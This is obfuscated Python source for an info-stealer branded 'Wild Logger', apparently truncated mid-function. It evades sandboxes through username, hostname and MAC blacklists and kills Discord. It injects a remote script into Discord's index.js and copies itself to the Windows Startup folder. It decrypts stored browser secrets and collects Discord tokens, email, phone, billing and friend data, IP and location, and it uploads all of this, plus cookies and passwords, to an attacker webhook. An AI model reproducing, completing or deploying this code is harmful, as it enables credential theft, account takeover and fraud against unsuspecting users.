import os #line:1
import threading #line:2
from sys import executable #line:3
from sqlite3 import connect as sql_connect #line:4
import re #line:5
from base64 import b64decode #line:6
from json import loads as json_loads ,load #line:7
from ctypes import windll ,wintypes ,byref ,cdll ,Structure ,POINTER ,c_char ,c_buffer #line:8
from urllib .request import Request ,urlopen #line:9
from json import *#line:10
import time #line:11
import shutil #line:12
from zipfile import ZipFile #line:13
import random #line:14
import re #line:15
import subprocess #line:16
import sys #line:17
import shutil #line:18
import uuid #line:19
import socket #line:20
import getpass #line:21
import ssl #line:22
ssl ._create_default_https_context =ssl ._create_unverified_context #line:26
blacklistUsers =['WDAGUtilityAccount','3W1GJT','QZSBJVWM','5ISYH9SH','Abby','hmarc','patex','RDhJ0CNFevzX','kEecfMwgj','Frank','8Nl0ColNQ5bq','Lisa','John','george','PxmdUOpVyx','8VizSM','w0fjuOVmCcP5A','lmVwjj9b','PqONjHVwexsS','3u2v9m8','Julia','HEUeRzl','fred','server','BvJChRPnsxn','Harry Johnson','SqgFOf3G','Lucas','mike','PateX','h7dk1xPr','Louise','User01','test','RGzcBUyrznReg']#line:28
username =getpass .getuser ()#line:30
if username .lower ()in blacklistUsers :#line:32
    os ._exit (0 )#line:33
def kontrol ():#line:35
    O0000O00OOO0OOO0O =['BEE7370C-8C0C-4','DESKTOP-NAKFFMT','WIN-5E07COS9ALR','B30F0242-1C6A-4','DESKTOP-VRSQLAG','Q9IATRKPRH','XC64ZB','DESKTOP-D019GDM','DESKTOP-WI8CLET','SERVER1','LISA-PC','JOHN-PC','DESKTOP-B0T93D6','DESKTOP-1PYKP29','DESKTOP-1Y2433R','WILEYPC','WORK','6C4E733F-C2D9-4','RALPHS-PC','DESKTOP-WG3MYJS','DESKTOP-7XC6GEZ','DESKTOP-5OV9S0O','QarZhrdBpj','ORELEEPC','ARCHIBALDPC','JULIA-PC','d1bnJkfVlH','NETTYPC','DESKTOP-BUGIO','DESKTOP-CBGPFEE','SERVER-PC','TIQIYLA9TW5M','DESKTOP-KALVINO','COMPNAME_4047','DESKTOP-19OLLTD','DESKTOP-DE369SE','EA8C2E2A-D017-4','AIDANPC','LUCAS-PC','MARCI-PC','ACEPC','MIKE-PC','DESKTOP-IAPKN1P','DESKTOP-NTU7VUO','LOUISE-PC','T00917','test42']#line:37
    OOOOOO00O0000O0OO =socket .gethostname ()#line:39
    if any (O00O0OO000000O00O in OOOOOO00O0000O0OO for O00O0OO000000O00O in O0000O00OOO0OOO0O ):#line:41
        os ._exit (0 )#line:42
kontrol ()#line:44
BLACKLIST1 =['00:15:5d:00:07:34','00:e0:4c:b8:7a:58','00:0c:29:2c:c1:21','00:25:90:65:39:e4','c8:9f:1d:b6:58:e4','00:25:90:36:65:0c','00:15:5d:00:00:f3','2e:b8:24:4d:f7:de','00:15:5d:13:6d:0c','00:50:56:a0:dd:00','00:15:5d:13:66:ca','56:e8:92:2e:76:0d','ac:1f:6b:d0:48:fe','00:e0:4c:94:1f:20','00:15:5d:00:05:d5','00:e0:4c:4b:4a:40','42:01:0a:8a:00:22','00:1b:21:13:15:20','00:15:5d:00:06:43','00:15:5d:1e:01:c8','00:50:56:b3:38:68','60:02:92:3d:f1:69','00:e0:4c:7b:7b:86','00:e0:4c:46:cf:01','42:85:07:f4:83:d0','56:b0:6f:ca:0a:e7','12:1b:9e:3c:a6:2c','00:15:5d:00:1c:9a','00:15:5d:00:1a:b9','b6:ed:9d:27:f4:fa','00:15:5d:00:01:81','4e:79:c0:d9:af:c3','00:15:5d:b6:e0:cc','00:15:5d:00:02:26','00:50:56:b3:05:b4','1c:99:57:1c:ad:e4','08:00:27:3a:28:73','00:15:5d:00:00:c3','00:50:56:a0:45:03','12:8a:5c:2a:65:d1','00:25:90:36:f0:3b','00:1b:21:13:21:26','42:01:0a:8a:00:22','00:1b:21:13:32:51','a6:24:aa:ae:e6:12','08:00:27:45:13:10','00:1b:21:13:26:44','3c:ec:ef:43:fe:de','d4:81:d7:ed:25:54','00:25:90:36:65:38','00:03:47:63:8b:de','00:15:5d:00:05:8d','00:0c:29:52:52:50','00:50:56:b3:42:33','3c:ec:ef:44:01:0c','06:75:91:59:3e:02','42:01:0a:8a:00:33','ea:f6:f1:a2:33:76','ac:1f:6b:d0:4d:98','1e:6c:34:93:68:64','00:50:56:a0:61:aa','42:01:0a:96:00:22','00:50:56:b3:21:29','00:15:5d:00:00:b3','96:2b:e9:43:96:76','b4:a9:5a:b1:c6:fd','d4:81:d7:87:05:ab','ac:1f:6b:d0:49:86','52:54:00:8b:a6:08','00:0c:29:05:d8:6e','00:23:cd:ff:94:f0','00:e0:4c:d6:86:77','3c:ec:ef:44:01:aa','00:15:5d:23:4c:a3','00:1b:21:13:33:55','00:15:5d:00:00:a4','16:ef:22:04:af:76','00:15:5d:23:4c:ad','1a:6c:62:60:3b:f4','00:15:5d:00:00:1d','00:50:56:a0:cd:a8','00:50:56:b3:fa:23','52:54:00:a0:41:92','00:50:56:b3:f6:57','00:e0:4c:56:42:97','ca:4d:4b:ca:18:cc','f6:a5:41:31:b2:78','d6:03:e4:ab:77:8e','00:50:56:ae:b2:b0','00:50:56:b3:94:cb','42:01:0a:8e:00:22','00:50:56:b3:4c:bf','00:50:56:b3:09:9e','00:50:56:b3:38:88','00:50:56:a0:d0:fa','00:50:56:b3:91:c8','3e:c1:fd:f1:bf:71','00:50:56:a0:6d:86','00:50:56:a0:af:75','00:50:56:b3:dd:03','c2:ee:af:fd:29:21','00:50:56:b3:ee:e1','00:50:56:a0:84:88','00:1b:21:13:32:20','3c:ec:ef:44:00:d0','00:50:56:ae:e5:d5','00:50:56:97:f6:c8','52:54:00:ab:de:59','00:50:56:b3:9e:9e','00:50:56:a0:39:18','32:11:4d:d0:4a:9e','00:50:56:b3:d0:a7','94:de:80:de:1a:35','00:50:56:ae:5d:ea','00:50:56:b3:14:59','ea:02:75:3c:90:9f','00:e0:4c:44:76:54','ac:1f:6b:d0:4d:e4','52:54:00:3b:78:24','00:50:56:b3:50:de','7e:05:a3:62:9c:4d','52:54:00:b3:e4:71','90:48:9a:9d:d5:24','00:50:56:b3:3b:a6','92:4c:a8:23:fc:2e','5a:e2:a6:a4:44:db','00:50:56:ae:6f:54','42:01:0a:96:00:33','00:50:56:97:a1:f8','5e:86:e4:3d:0d:f6','00:50:56:b3:ea:ee','3e:53:81:b7:01:13','00:50:56:97:ec:f2','00:e0:4c:b3:5a:2a','12:f8:87:ab:13:ec','00:50:56:a0:38:06','2e:62:e8:47:14:49','00:0d:3a:d2:4f:1f','60:02:92:66:10:79','','00:50:56:a0:d7:38','be:00:e5:c5:0c:e5','00:50:56:a0:59:10','00:50:56:a0:06:8d','00:e0:4c:cb:62:08','4e:81:81:8e:22:4e']#line:46
mac_address =uuid .getnode ()#line:48
if str (uuid .UUID (int =mac_address ))in BLACKLIST1 :#line:49
    os ._exit (0 )#line:50
webh00k ="0WebhookHere0"#line:55
inject_url ="https://github.com/brickinghouses/Wild-Logger/blob/main/index.js"#line:56
DETECTED =False #line:58
def g3t1p ():#line:60
    OOOOO000O0000O0O0 ="None"#line:61
    try :#line:62
        OOOOO000O0000O0O0 =urlopen (Request ("https://api.ipify.org")).read ().decode ().strip ()#line:63
    except :#line:64
        pass #line:65
    return OOOOO000O0000O0O0 #line:66
requirements =[["requests","requests"],["Crypto.Cipher","pycryptodome"],]#line:71
for modl in requirements :#line:72
    try :__import__ (modl [0 ])#line:73
    except :#line:74
        subprocess .Popen (f"{executable} -m pip install {modl[1]}",shell =True )#line:75
        time .sleep (3 )#line:76
import requests #line:78
from Crypto .Cipher import AES #line:79
local =os .getenv ('LOCALAPPDATA')#line:81
roaming =os .getenv ('APPDATA')#line:82
temp =os .getenv ("TEMP")#line:83
Threadlist =[]#line:84
class DATA_BLOB (Structure ):#line:87
    _fields_ =[('cbData',wintypes .DWORD ),('pbData',POINTER (c_char ))]#line:91
def G3tD4t4 (OOO0O0O0OOOO00O0O ):#line:93
    OOO00OOOO00O0O00O =int (OOO0O0O0OOOO00O0O .cbData )#line:94
    OOOOO0OOOOOO0OO0O =OOO0O0O0OOOO00O0O .pbData #line:95
    OO0O000O00OO00O0O =c_buffer (OOO00OOOO00O0O00O )#line:96
    cdll .msvcrt .memcpy (OO0O000O00OO00O0O ,OOOOO0OOOOOO0OO0O ,OOO00OOOO00O0O00O )#line:97
    windll .kernel32 .LocalFree (OOOOO0OOOOOO0OO0O )#line:98
    return OO0O000O00OO00O0O .raw #line:99
def CryptUnprotectData (OO00000OOO0OOOOO0 ,entropy =b''):#line:101
    O00O0O00O00OO0000 =c_buffer (OO00000OOO0OOOOO0 ,len (OO00000OOO0OOOOO0 ))#line:102
    O00OOOOO000OOO000 =c_buffer (entropy ,len (entropy ))#line:103
    OOO0O0OOOOO0O0O0O =DATA_BLOB (len (OO00000OOO0OOOOO0 ),O00O0O00O00OO0000 )#line:104
    O00O0OOOOO0O00O0O =DATA_BLOB (len (entropy ),O00OOOOO000OOO000 )#line:105
    O0OO0O0O00000O0OO =DATA_BLOB ()#line:106
    if windll .crypt32 .CryptUnprotectData (byref (OOO0O0OOOOO0O0O0O ),None ,byref (O00O0OOOOO0O00O0O ),None ,None ,0x01 ,byref (O0OO0O0O00000O0OO )):#line:108
        return G3tD4t4 (O0OO0O0O00000O0OO )#line:109
def D3kryptV4lU3 (O000OO00OOOOOO00O ,master_key =None ):#line:111
    O00OO000OO0O00000 =O000OO00OOOOOO00O .decode (encoding ='utf8',errors ='ignore')[:3 ]#line:112
    if O00OO000OO0O00000 =='v10'or O00OO000OO0O00000 =='v11':#line:113
        OOOOOOO000000OO0O =O000OO00OOOOOO00O [3 :15 ]#line:114
        O00OO0OO00OO00O00 =O000OO00OOOOOO00O [15 :]#line:115
        OO00000O000O0O0O0 =AES .new (master_key ,AES .MODE_GCM ,OOOOOOO000000OO0O )#line:116
        OO0OOO00OO0O00O00 =OO00000O000O0O0O0 .decrypt (O00OO0OO00OO00O00 )#line:117
        OO0OOO00OO0O00O00 =OO0OOO00OO0O00O00 [:-16 ].decode ()#line:118
        return OO0OOO00OO0O00O00 #line:119
def L04dR3qu3sTs (OO0OO0OO000O0O000 ,O00O0O0OOOO000000 ,data ='',files ='',headers =''):#line:121
    for OOO000OO0O0000OO0 in range (8 ):#line:122
        try :#line:123
            if OO0OO0OO000O0O000 =='POST':#line:124
                if data !='':#line:125
                    OOOO000OO0O00O00O =requests .post (O00O0O0OOOO000000 ,data =data )#line:126
                    if OOOO000OO0O00O00O .status_code ==200 :#line:127
                        return OOOO000OO0O00O00O #line:128
                elif files !='':#line:129
                    OOOO000OO0O00O00O =requests .post (O00O0O0OOOO000000 ,files =files )#line:130
                    if OOOO000OO0O00O00O .status_code ==200 or OOOO000OO0O00O00O .status_code ==413 :#line:131
                        return OOOO000OO0O00O00O #line:132
        except :#line:133
            pass #line:134
def L04durl1b (O00O000OOOOOO00O0 ,data ='',files ='',headers =''):#line:136
    for OOOO0000OOOO0O0OO in range (8 ):#line:137
        try :#line:138
            if headers !='':#line:139
                OO0OO00O0OO0O0O0O =urlopen (Request (O00O000OOOOOO00O0 ,data =data ,headers =headers ))#line:140
                return OO0OO00O0OO0O0O0O #line:141
            else :#line:142
                OO0OO00O0OO0O0O0O =urlopen (Request (O00O000OOOOOO00O0 ,data =data ))#line:143
                return OO0OO00O0OO0O0O0O #line:144
        except :#line:145
            pass #line:146
def globalInfo ():#line:148
    O0000OO0OO0OOOOOO =g3t1p ()#line:149
    OOOOOOOO0O000OO0O =os .getenv ("USERNAME")#line:150
    OO0000O00OOOO0O00 =urlopen (Request (f"https://geolocation-db.com/jsonp/{O0000OO0OO0OOOOOO}")).read ().decode ().replace ('callback(','').replace ('})','}')#line:151
    OO0O0OO000OOOO0OO =loads (OO0000O00OOOO0O00 )#line:153
    OO0O00OO0OOOOO0OO =OO0O0OO000OOOO0OO ["country_name"]#line:155
    O0OOO0OO0O0OO0OO0 =OO0O0OO000OOOO0OO ["country_code"].lower ()#line:156
    O0O0OOOOOOOO0O00O =OO0O0OO000OOOO0OO ["state"]#line:157
    O0OOO00O00000OOO0 =f":flag_{O0OOO0OO0O0OO0OO0}:  - `{OOOOOOOO0O000OO0O.upper()} | {O0000OO0OO0OOOOOO} ({OO0O00OO0OOOOO0OO})`"#line:159
    return O0OOO00O00000OOO0 #line:160
def TR6st (O000OO00O0O000O00 ):#line:163
    global DETECTED #line:165
    OO0OO00O0OOOO000O =str (O000OO00O0O000O00 )#line:166
    OOO00O0O0O0OO000O =re .findall (".google.com",OO0OO00O0OOOO000O )#line:167
    if len (OOO00O0O0O0OO000O )<-1 :#line:169
        DETECTED =True #line:170
        return DETECTED #line:171
    else :#line:172
        DETECTED =False #line:173
        return DETECTED #line:174
def G3tUHQFr13ndS (OOO00OOO0OOO0O000 ):#line:176
    OOO0OOO000OOOO0O0 =[{"Name":'Active_Developer','Value':131072 ,'Emoji':"<:activedev:1042545590640324608> "},{"Name":'Early_Verified_Bot_Developer','Value':131072 ,'Emoji':"<:developer:874750808472825986> "},{"Name":'Bug_Hunter_Level_2','Value':16384 ,'Emoji':"<:bughunter_2:874750808430874664> "},{"Name":'Early_Supporter','Value':512 ,'Emoji':"<:early_supporter:874750808414113823> "},{"Name":'House_Balance','Value':256 ,'Emoji':"<:balance:874750808267292683> "},{"Name":'House_Brilliance','Value':128 ,'Emoji':"<:brilliance:874750808338608199> "},{"Name":'House_Bravery','Value':64 ,'Emoji':"<:bravery:874750808388952075> "},{"Name":'Bug_Hunter_Level_1','Value':8 ,'Emoji':"<:bughunter_1:874750808426692658> "},{"Name":'HypeSquad_Events','Value':4 ,'Emoji':"<:hypesquad_events:874750808594477056> "},{"Name":'Partnered_Server_Owner','Value':2 ,'Emoji':"<:partner:874750808678354964> "},{"Name":'Discord_Employee','Value':1 ,'Emoji':"<:staff:874750808728666152> "}]#line:189
    O0000OOOOOO00O0O0 ={"Authorization":OOO00OOO0OOO0O000 ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:194
    try :#line:195
        OO0OO00OOOOOO0O0O =loads (urlopen (Request ("https://discord.com/api/v6/users/@me/relationships",headers =O0000OOOOOO00O0O0 )).read ().decode ())#line:196
    except :#line:197
        return False #line:198
    OO00O000OO0OOOO0O =''#line:200
    for OOOO0O0000O00O0O0 in OO0OO00OOOOOO0O0O :#line:201
        O00O0OOOO00OO0O00 =''#line:202
        O0OOO0O00O0O00OOO =OOOO0O0000O00O0O0 ['user']['public_flags']#line:203
        for OOOOO0O000000O0OO in OOO0OOO000OOOO0O0 :#line:204
            if O0OOO0O00O0O00OOO //OOOOO0O000000O0OO ["Value"]!=0 and OOOO0O0000O00O0O0 ['type']==1 :#line:205
                if not "House"in OOOOO0O000000O0OO ["Name"]:#line:206
                    O00O0OOOO00OO0O00 +=OOOOO0O000000O0OO ["Emoji"]#line:207
                O0OOO0O00O0O00OOO =O0OOO0O00O0O00OOO %OOOOO0O000000O0OO ["Value"]#line:208
        if O00O0OOOO00OO0O00 !='':#line:209
            OO00O000OO0OOOO0O +=f"{O00O0OOOO00OO0O00} | {OOOO0O0000O00O0O0['user']['username']}#{OOOO0O0000O00O0O0['user']['discriminator']} ({OOOO0O0000O00O0O0['user']['id']})\n"#line:210
    return OO00O000OO0OOOO0O #line:211
process_list =os .popen ('tasklist').readlines ()#line:214
for process in process_list :#line:217
    if "Discord"in process :#line:218
        pid =int (process .split ()[1 ])#line:220
        os .system (f"taskkill /F /PID {pid}")#line:221
def G3tb1ll1ng (O0O0OOOO0O0O0OOOO ):#line:223
    OOO0OOO000O0O0000 ={"Authorization":O0O0OOOO0O0O0OOOO ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:228
    try :#line:229
        O00OO0000O0OOO00O =loads (urlopen (Request ("https://discord.com/api/users/@me/billing/payment-sources",headers =OOO0OOO000O0O0000 )).read ().decode ())#line:230
    except :#line:231
        return False #line:232
    if O00OO0000O0OOO00O ==[]:return "```None```"#line:234
    O000OO0O0OO00OOO0 =""#line:236
    for O000000O0OO00O000 in O00OO0000O0OOO00O :#line:237
        if O000000O0OO00O000 ["invalid"]==False :#line:238
            if O000000O0OO00O000 ["type"]==1 :#line:239
                O000OO0O0OO00OOO0 +=":credit_card:"#line:240
            elif O000000O0OO00O000 ["type"]==2 :#line:241
                O000OO0O0OO00OOO0 +=":parking: "#line:242
    return O000OO0O0OO00OOO0 #line:244
def inj_discord ():#line:246
    O0O0O0000OOOOOOO0 =os .getlogin ()#line:248
    OOOO0O0O0OO000O00 =['Discord','DiscordCanary','DiscordPTB','DiscordDevelopment']#line:250
    for O0OO0OOO0OO00O000 in OOOO0O0O0OO000O00 :#line:252
        OO000OOOOO0O0OO0O =os .path .join (os .getenv ('LOCALAPPDATA'),O0OO0OOO0OO00O000 )#line:253
        if os .path .isdir (OO000OOOOO0O0OO0O ):#line:254
            for OO0OOO0O0OOO000OO ,O000O00O000000OOO ,OOO0O0000OOOOOOOO in os .walk (OO000OOOOO0O0OO0O ):#line:255
                if 'app-'in OO0OOO0O0OOO000OO :#line:256
                    for O000O0O0OOOO00000 in O000O00O000000OOO :#line:257
                        if 'modules'in O000O0O0OOOO00000 :#line:258
                            OO0O00O0O0O0O0O00 =os .path .join (OO0OOO0O0OOO000OO ,O000O0O0OOOO00000 )#line:259
                            for O0O000OOO00OOO00O ,O0OOO0000O000000O ,O00O0O00OO000000O in os .walk (OO0O00O0O0O0O0O00 ):#line:260
                                if 'discord_desktop_core-'in O0O000OOO00OOO00O :#line:261
                                    for OO0O0O000OO000O0O ,O000O0000O0OOO0OO ,O0OO0O00O000O0OOO in os .walk (O0O000OOO00OOO00O ):#line:262
                                        if 'discord_desktop_core'in OO0O0O000OO000O0O :#line:263
                                            for O0OOO0O0O00OO00O0 in O0OO0O00O000O0OOO :#line:264
                                                if O0OOO0O0O00OO00O0 =='index.js':#line:265
                                                    O000OOO000OO00OO0 =os .path .join (OO0O0O000OO000O0O ,O0OOO0O0O00OO00O0 )#line:266
                                                    O00OO0O0OO0OO000O =requests .get (inject_url ).text #line:268
                                                    O00OO0O0OO0OO000O =O00OO0O0OO0OO000O .replace ("%WEBHOOK%",webh00k )#line:270
                                                    with open (O000OOO000OO00OO0 ,"w",encoding ="utf-8")as OOO0OOOO0OO0OO0OO :#line:272
                                                        OOO0OOOO0OO0OO0OO .write (O00OO0O0OO0OO000O )#line:273
inj_discord ()#line:274
def G3tb3dge1 (O0000000O0OOOO000 ):#line:276
    if O0000000O0OOOO000 ==0 :return ''#line:277
    O00OOOO0OO00OOO0O =''#line:279
    O0OOOOO0OOOOOO0O0 =[{"Name":'Active_Developer','Value':131072 ,'Emoji':"<:activedev:1042545590640324608> "},{"Name":'Early_Verified_Bot_Developer','Value':131072 ,'Emoji':"<:developer:874750808472825986> "},{"Name":'Bug_Hunter_Level_2','Value':16384 ,'Emoji':"<:bughunter_2:874750808430874664> "},{"Name":'Early_Supporter','Value':512 ,'Emoji':"<:early_supporter:874750808414113823> "},{"Name":'House_Balance','Value':256 ,'Emoji':"<:balance:874750808267292683> "},{"Name":'House_Brilliance','Value':128 ,'Emoji':"<:brilliance:874750808338608199> "},{"Name":'House_Bravery','Value':64 ,'Emoji':"<:bravery:874750808388952075> "},{"Name":'Bug_Hunter_Level_1','Value':8 ,'Emoji':"<:bughunter_1:874750808426692658> "},{"Name":'HypeSquad_Events','Value':4 ,'Emoji':"<:hypesquad_events:874750808594477056> "},{"Name":'Partnered_Server_Owner','Value':2 ,'Emoji':"<:partner:874750808678354964> "},{"Name":'Discord_Employee','Value':1 ,'Emoji':"<:staff:874750808728666152> "}]#line:292
    for O0O00O000OOO00000 in O0OOOOO0OOOOOO0O0 :#line:293
        if O0000000O0OOOO000 //O0O00O000OOO00000 ["Value"]!=0 :#line:294
            O00OOOO0OO00OOO0O +=O0O00O000OOO00000 ["Emoji"]#line:295
            O0000000O0OOOO000 =O0000000O0OOOO000 %O0O00O000OOO00000 ["Value"]#line:296
    return O00OOOO0OO00OOO0O #line:298
def G3tT0k4n1nf9 (OOO00O00O00OO0O0O ):#line:300
    OOOO0O00OO0O00O00 ={"Authorization":OOO00O00O00OO0O0O ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:305
    O0O000OO00OO000O0 =loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me",headers =OOOO0O00OO0O00O00 )).read ().decode ())#line:307
    OO00000000OO0OOO0 =O0O000OO00OO000O0 ["username"]#line:308
    O0OO0O00OO00OOOO0 =O0O000OO00OO000O0 ["discriminator"]#line:309
    OOO00OO0OO0000OOO =O0O000OO00OO000O0 ["email"]#line:310
    O00O0OOO0OO0OO0O0 =O0O000OO00OO000O0 ["id"]#line:311
    O0OOOO00O000OOOO0 =O0O000OO00OO000O0 ["avatar"]#line:312
    OO0000OO00OO00O00 =O0O000OO00OO000O0 ["public_flags"]#line:313
    OO0O00O00O00OOO0O =""#line:314
    O000O00OOO0OOO000 =""#line:315
    if "premium_type"in O0O000OO00OO000O0 :#line:317
        O0OO00OOOOOO000O0 =O0O000OO00OO000O0 ["premium_type"]#line:318
        if O0OO00OOOOOO000O0 ==1 :#line:319
            OO0O00O00O00OOO0O ="<a:DE_BadgeNitro:865242433692762122>"#line:320
        elif O0OO00OOOOOO000O0 ==2 :#line:321
            OO0O00O00O00OOO0O ="<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>"#line:322
    if "ph0n3"in O0O000OO00OO000O0 :O000O00OOO0OOO000 =f'{O0O000OO00OO000O0["ph0n3"]}'#line:323
    return OO00000000OO0OOO0 ,O0OO0O00OO00OOOO0 ,OOO00OO0OO0000OOO ,O00O0OOO0OO0OO0O0 ,O0OOOO00O000OOOO0 ,OO0000OO00OO00O00 ,OO0O00O00O00OOO0O ,O000O00OOO0OOO000 #line:325
def ch1ckT4k1n (OO0OOOOO00OO0O0OO ):#line:327
    OOO00OOO0000OO0O0 ={"Authorization":OO0OOOOO00OO0O0OO ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:332
    try :#line:333
        urlopen (Request ("https://discordapp.com/api/v6/users/@me",headers =OOO00OOO0000OO0O0 ))#line:334
        return True #line:335
    except :#line:336
        return False #line:337
if getattr (sys ,'frozen',False ):#line:339
    currentFilePath =os .path .dirname (sys .executable )#line:340
else :#line:341
    currentFilePath =os .path .dirname (os .path .abspath (__file__ ))#line:342
fileName =os .path .basename (sys .argv [0 ])#line:344
filePath =os .path .join (currentFilePath ,fileName )#line:345
startupFolderPath =os .path .join (os .path .expanduser ('~'),'AppData','Roaming','Microsoft','Windows','Start Menu','Programs','Startup')#line:347
startupFilePath =os .path .join (startupFolderPath ,fileName )#line:348
if os .path .abspath (filePath ).lower ()!=os .path .abspath (startupFilePath ).lower ():#line:350
    with open (filePath ,'rb')as src_file ,open (startupFilePath ,'wb')as dst_file :#line:351
        shutil .copyfileobj (src_file ,dst_file )#line:352
def upl05dT4k31 (O00O0OO0OOO0O0000 ,OOOOO0O00O0O0OOO0 ):#line:355
    global webh00k #line:356
    O00O00OO0O0000OO0 ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:360
    O00OO0OOOOO0OO0O0 ,O000OOO00O00OO0OO ,OO00O00O00O00O0O0 ,OOO00OOOOO00O000O ,O0OO000OOOOO000O0 ,O0O00OOO000O0OO0O ,OOO0OOO0O0OOOO00O ,OO0OO0000OOO000OO =G3tT0k4n1nf9 (O00O0OO0OOO0O0000 )#line:361
    if O0OO000OOOOO000O0 ==None :#line:363
        O0OO000OOOOO000O0 ="https://github.com/brickinghouses/Wild-Logger/blob/main/proxy-image.jpg"#line:364
    else :#line:365
        O0OO000OOOOO000O0 =f"https://cdn.discordapp.com/avatars/{OOO00OOOOO00O000O}/{O0OO000OOOOO000O0}"#line:366
    OO0O00OO00OOOOO0O =G3tb1ll1ng (O00O0OO0OOO0O0000 )#line:368
    OO00OO0OO0O0OO00O =G3tb3dge1 (O0O00OOO000O0OO0O )#line:369
    O0000O0OO000O000O =G3tUHQFr13ndS (O00O0OO0OOO0O0000 )#line:370
    if O0000O0OO000O000O =='':O0000O0OO000O000O ="```No Rare Friends```"#line:371
    if not OO0O00OO00OOOOO0O :#line:372
        OO00OO0OO0O0OO00O ,OO0OO0000OOO000OO ,OO0O00OO00OOOOO0O ="🔒","🔒","🔒"#line:373
    if OOO0OOO0O0OOOO00O ==''and OO00OO0OO0O0OO00O =='':OOO0OOO0O0OOOO00O ="```None```"#line:374
    O0OOOO0OO0O000OOO ={"content":f'{globalInfo()} | `{OOOOO0O00O0O0OOO0}`',"embeds":[{"color":2895667 ,"fields":[{"name":"<a:hyperNOPPERS:828369518199308388> Discord Token:","value":f"```{O00O0OO0OOO0O0000}```","inline":True },{"name":"<:mail:750393870507966486> Email addy:","value":f"```{OO00O00O00O00O0O0}```","inline":True },{"name":"<a:1689_Ringing_Phone:755219417075417088> Phone Number:","value":f"```{OO0OO0000OOO000OO}```","inline":True },{"name":"<:mc_earth:589630396476555264> IP Addy:","value":f"```{g3t1p()}```","inline":True },{"name":"<:woozyface:874220843528486923> Badges:","value":f"{OOO0OOO0O0OOOO00O}{OO00OO0OO0O0OO00O}","inline":True },{"name":"<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:","value":f"{OO0O00OO00OOOOO0O}","inline":True },{"name":"<a:mavikirmizi:853238372591599617> Friends:","value":f"{O0000O0OO000O000O}","inline":False }],"author":{"name":f"{O00OO0OOOOO0OO0O0}#{O000OOO00O00OO0OO} ({OOO00OOOOO00O000O})","icon_url":f"{O0OO000OOOOO000O0}"},"footer":{"text":"Wild Logger","icon_url":"https://github.com/brickinghouses/Wild-Logger/blob/main/proxy-image.jpg"},"thumbnail":{"url":f"{O0OO000OOOOO000O0}"}}],"avatar_url":"hhttps://github.com/brickinghouses/Wild-Logger/blob/main/proxy-image.jpg","username":"Wild Logger","attachments":[]}#line:434
    L04durl1b (webh00k ,data =dumps (O0OOOO0OO0O000OOO ).encode (),headers =O00O00OO0O0000OO0 )#line:435
def R4f0rm3t (OO0OO0OO00O000OO0 ):#line:438
    O0OO00O0O00O00OO0 =re .findall ("(\w+[a-z])",OO0OO0OO00O000OO0 )#line:439
    while "https"in O0OO00O0O00O00OO0 :O0OO00O0O00O00OO0 .remove ("https")#line:440
    while "com"in O0OO00O0O00O00OO0 :O0OO00O0O00O00OO0 .remove ("com")#line:441
    while "net"in O0OO00O0O00O00OO0 :O0OO00O0O00O00OO0 .remove ("net")#line:442
    return list (set (O0OO00O0O00O00OO0 ))#line:443
def upload (OOOOO0O00O0OOO000 ,OO000O000OO0O0000 ):#line:445
    O0O0OO00O00OO00OO ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:449
    if OOOOO0O00O0OOO000 =="crcook":#line:451
        O00000OO0O00OO0OO =' | '.join (OO0O0OO00O0OOOOO0 for OO0O0OO00O0OOOOO0 in cookiWords )#line:452
        if len (O00000OO0O00OO0OO )>1000 :#line:453
            OOO0OOOO00OOO0OO0 =R4f0rm3t (str (cookiWords ))#line:454
            O00000OO0O00OO0OO =' | '.join (OOO0000O0OO0OO000 for OOO0000O0OO0OO000 in OOO0OOOO00OOO0OO0 )#line:455
        O0OO000O000OO0OO0 ={"content":f"{globalInfo()}","embeds":[{"title":"Wild Cookies Logger","description":f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{O00000OO0O00OO0OO}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Yummy Cookies Found:3\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({OO000O000OO0O0000})","color":2895667 ,"footer":{"text":"Wild Logger","icon_url":"https://github.com/brickinghouses/Wild-Logger/blob/main/proxy-image.jpg"}}],"username":"Wild Logger","avatar_url":"https://github.com/brickinghouses/Wild-Logger/blob/main/proxy-image.jpg","attachments":[]}#line:472
        L04durl1b (webh00k ,data =dumps (O0OO000O000OO0OO0 ).encode (),headers =O0O0OO00O00OO00OO )#line:473
        return #line:474
    if OOOOO0O00O0OOO000 =="crpassw":#line:476
        OOO0000OOO0000OO0 =' | '.join (O0OO000OO00OOOOO0 for O0OO000OO00OOOOO0 in paswWords )#line:477
        if len (OOO0000OOO0000OO0 )>1000 :#line:478
            O0OOO00O0OOOO0OOO =R4f0rm3t (str (paswWords ))#line:479
            OOO0000OOO0000OO0 =' | '.join (O00OO0O0000OOO00O for O00OO0O0000OOO00O in O0OOO00O0OOOO0OOO )#line:480
        O0OO000O000OO0OO0 ={"content":f"{globalInfo()}","embeds":[{"title":"Wild Passwords Stealer","description":f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{OOO0000OOO0000OO0}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPassword.txt]({OO000O000OO0O0000})","color":2895667 ,"footer":{"text":"Wild Logger","icon_url":"https://github.com/brickinghouses/Wild-Logger/blob/main/proxy-image.jpg"}}],"username":"Wild","avatar_url":"https://github.com/brickinghouses/Wild-Logger/blob/main/proxy-image.jpg","attachments":[]}#line:498
